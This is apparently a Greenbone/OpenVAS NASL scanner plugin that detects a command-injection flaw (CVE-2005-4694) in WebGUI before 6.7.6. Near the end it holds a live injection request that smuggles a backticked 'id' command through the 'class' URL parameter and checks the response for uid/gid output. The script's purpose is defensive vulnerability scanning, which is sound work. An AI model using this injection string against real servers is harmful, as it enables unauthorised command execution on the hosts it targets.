# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.20014");
  script_version("2023-08-01T13:29:10+0000");
  script_tag(name:"last_modification", value:"2023-08-01 13:29:10 +0000 (Tue, 01 Aug 2023)");
  script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2005-4694");
  script_xref(name:"OSVDB", value:"19933");
  script_name("WebGUI < 6.7.6 arbitrary command execution");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.plainblack.com/getwebgui/advisories/security-exploit-patch-for-6.3-and-above");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/15083");

  script_tag(name:"summary", value:"The installed version of WebGUI on the remote host fails to sanitize
  user-supplied input via the 'class' variable to various sources before using it to run commands.");

  script_tag(name:"impact", value:"By leveraging this flaw, an attacker may be
  able to execute arbitrary commands on the remote host within the context of
  the affected web server userid.");

  script_tag(name:"solution", value:"Upgrade to WebGUI 6.7.6 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

http_check_remote_code(
  check_request:"/index.pl/homels?func=add;class=WebGUI::Asset::Wobject::Article%3bprint%20%60id%60;",
  check_result:"uid=[0-9]+.*gid=[0-9]+.*",
  extra_check:'<meta name="generator" content="WebGUI 6',
  command:"id");

exit( 99 );
